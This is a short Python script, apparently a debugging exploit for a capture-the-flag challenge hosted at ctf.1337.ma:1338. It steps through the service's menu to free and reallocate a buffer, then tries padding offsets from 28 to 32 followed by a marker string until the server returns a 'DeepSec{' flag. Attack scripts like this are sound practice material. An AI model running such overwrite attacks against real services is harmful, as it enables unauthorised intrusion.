#!/usr/bin/env python3
"""
Debugging version - try different offsets and payloads
"""

import socket
import time

def try_exploit(offset, marker):
    host = 'ctf.1337.ma'
    port = 1338
    
    print(f"\n{'='*60}")
    print(f"[*] Trying offset={offset}, marker={marker}")
    print(f"{'='*60}")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    
    # Receive banner
    s.recv(4096)
    
    # Obliterate
    s.send(b'2\n')
    time.sleep(0.2)
    s.recv(4096)
    
    # Reserve space - try size 0x26 (38)
    s.send(b'1\n')
    time.sleep(0.2)
    s.recv(4096)
    
    s.send(b'38\n')
    time.sleep(0.2)
    s.recv(4096)
    
    # Payload with variable offset
    payload = b'A' * offset + marker.encode() + b'\n'
    print(f"[*] Payload: {payload}")
    s.send(payload)
    time.sleep(0.2)
    s.recv(4096)
    
    # Road to salvation
    s.send(b'3\n')
    time.sleep(0.5)
    
    response = s.recv(8192).decode(errors='ignore')
    s.close()
    
    if 'DeepSec{' in response:
        print(f"[+] SUCCESS with offset={offset}!")
        print(response)
        return response
    elif 'Forever' in response or 'doomed' in response:
        print(f"[-] Failed - got 'doomed' message")
        return None
    else:
        print(f"[?] Unknown response")
        print(response[-200:])
        return None

# Try different offsets around 30
for offset in [28, 29, 30, 31, 32]:
    result = try_exploit(offset, 'w3th4nds')
    if result:
        print(f"\n{'='*60}")
        print(f"[+] FOUND WORKING OFFSET: {offset}")
        print(f"{'='*60}")
        break
    time.sleep(0.5)
